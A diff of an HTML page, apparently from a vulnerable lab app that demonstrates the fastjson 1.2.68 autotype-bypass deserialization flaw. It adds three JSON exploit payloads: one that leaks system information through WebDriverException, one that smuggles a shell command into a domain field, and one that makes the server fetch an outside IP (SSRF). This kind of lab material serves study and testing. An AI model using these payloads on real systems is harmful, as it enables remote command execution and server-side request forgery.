@@ -50,9 +50,14 @@
         <input type="button" id="button" value="提交"/>
     </form>
 	<hr>
-	<p>fastjson 1.2.68 autotype bypass 反序列化漏洞</p>
-	<a href="/webdriverexception" target="_blank" >1. webdriverexception 直接调用触发fastjson漏洞(调用失败，暂时未找到问题)</a> <br/>
-	<a href="/pingexception" target="_blank" >1. pingexception 直接调用触发fastjson漏洞</a> <br/>
-	<a href="/datasourceexception" target="_blank" >1. datasourceexception 直接调用触发fastjson漏洞</a> <br/>
+	
+	<p>1. fastjson 1.2.68 autotype bypass 反序列化漏洞</p >
+ 	<a href="/fastjson68/webdriverexception" target="_blank" >1. webdriverexception 直接调用触发fastjson漏洞(调用失败，暂时未找到问题)</a > <br/> 
+ 	<p>comment = {"x":{"@type":"java.lang.Exception","@type":"org.openqa.selenium.WebDriverException"},"content":{"$ref":"$x.systemInformation"}}</p >
+ 	<a href="/fastjson68/pingexception" target="_blank" >1. pingexception 直接调用触发fastjson漏洞</a > <br/>
+ 	<p>cmd = {"@type":"java.lang.Exception", "@type":"com.snowsec0.fastjson68.PingException","domain":"b1ue.cn&&calc"};</p >
+ 	<a href="/fastjson68/datasourceexception" target="_blank" >1. datasourceexception 直接调用触发fastjson漏洞</a > <br/>
+ 	<p>url = {"@type":"java.lang.Exception","@type":"com.snowsec0.fastjson68.DatasourceException", "dataSource": {"@type": "java.net.URL", "val": "http://47.104.218.243/ssrf/ssrf.php?rand=fastjson"}}</p >
+
 </body>
 </html>
